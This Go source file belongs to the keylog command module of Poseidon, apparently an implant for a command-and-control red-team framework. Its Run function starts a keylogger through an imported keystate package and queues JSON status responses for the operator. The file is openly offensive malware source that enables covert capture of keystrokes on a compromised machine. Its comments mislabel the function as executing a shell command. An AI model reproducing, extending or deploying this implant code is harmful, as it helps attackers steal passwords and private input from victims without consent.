package keylog

import (
	"encoding/json"
	"fmt"
	"sync"

	"github.com/xorrior/poseidon/pkg/commands/keylog/keystate"
	"github.com/xorrior/poseidon/pkg/profiles"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

//Run - Function that executes the shell command
var mu sync.Mutex

//Run - Function that executes the shell command
func Run(task structs.Task) {

	msg := structs.Response{}
	msg.TaskID = task.TaskID

	err := keystate.StartKeylogger(task)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Started keylogger.")
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
